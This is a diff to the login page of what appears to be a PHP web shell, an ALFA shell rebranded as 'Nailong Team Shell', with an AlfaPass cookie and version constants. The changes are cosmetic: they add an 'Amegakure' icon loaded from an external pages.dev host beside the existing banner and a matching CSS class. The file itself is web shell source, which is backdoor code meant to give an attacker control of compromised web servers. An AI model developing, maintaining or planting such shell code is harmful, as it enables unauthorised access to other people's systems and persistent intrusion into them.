@@ -528,12 +528,25 @@ __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 }
 echo '
 <style>
+.amegakure-icon {
+    width: 42px;
+    height: 42px;
+    object-fit: contain;
+    display: inline-block;
+}
 body{background: black;}
 #loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
 <title>~ Nailong Team Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
-<center><img style="border-radius:100px;" width="500" height="250" alt="Nailong Team 2012" draggable="false" src="https://nabila2.pages.dev/img/ilong.png" /></center>
+<center>
+<img
+    class="amegakure-icon"
+    src="https://seo-amegakure.pages.dev/assets/icon.png"
+    alt="Amegakure"
+    style="border-radius:100px;"
+>
+<img style="border-radius:100px;" width="500" height="250" alt="Nailong Team 2012" draggable="false" src="https://nabila2.pages.dev/img/ilong.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
 <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Nailong Team Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
